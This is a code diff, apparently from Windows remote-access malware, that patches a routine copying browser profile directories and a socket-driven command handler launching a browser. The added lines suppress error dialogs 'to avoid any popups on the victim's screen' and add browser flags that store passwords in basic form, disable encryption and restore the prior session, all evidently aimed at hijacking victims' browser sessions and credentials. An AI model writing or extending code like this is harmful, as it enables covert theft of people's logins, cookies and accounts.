@@ -1189,8 +1189,16 @@ static wstring get_browser_profile_path(const wstring& browserName) {
 }
 
 static bool copy_directory(const wstring& source, const wstring& destination) {
+    // Ensure destination exists
+    SHCreateDirectoryExW(NULL, destination.c_str(), NULL);
+
+    // To copy contents, source must end with \*
+    wstring src = source;
+    if (!src.empty() && src.back() != L'\\' && src.back() != L'/') src += L'\\';
+    src += L"*";
+
     // SHFileOperation requires double-null terminated strings
-    vector<wchar_t> from(source.begin(), source.end());
+    vector<wchar_t> from(src.begin(), src.end());
     from.push_back(L'\0');
     from.push_back(L'\0');
 
@@ -1202,7 +1210,9 @@ static bool copy_directory(const wstring& source, const wstring& destination) {
     fileOp.wFunc = FO_COPY;
     fileOp.pFrom = from.data();
     fileOp.pTo = to.data();
-    fileOp.fFlags = FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_SILENT | FOF_NOERRORUI;
+    // FOF_NOCONFIRMMKDIR is important.
+    // We use FOF_NOERRORUI and FOF_SILENT to avoid any popups on the victim's screen.
+    fileOp.fFlags = FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_SILENT | FOF_NOERRORUI | FOF_RENAMEONCOLLISION;
 
     return SHFileOperationW(&fileOp) == 0;
 }
@@ -1323,7 +1333,11 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                                    L" --disable-setuid-sandbox"
                                    L" --disable-infobars"
                                    L" --disable-gpu-compositing"
-                                   L" --force-cpu-draw";
+                                   L" --force-cpu-draw"
+                                   L" --disable-features=LockProfile"
+                                   L" --password-store=basic"
+                                   L" --disable-encryption-win"
+                                   L" --restore-last-session";
 
                     wstring fullCmd = L"\"" + exePath + L"\"" + args;
                     vector<wchar_t> cmdLine(fullCmd.begin(), fullCmd.end());
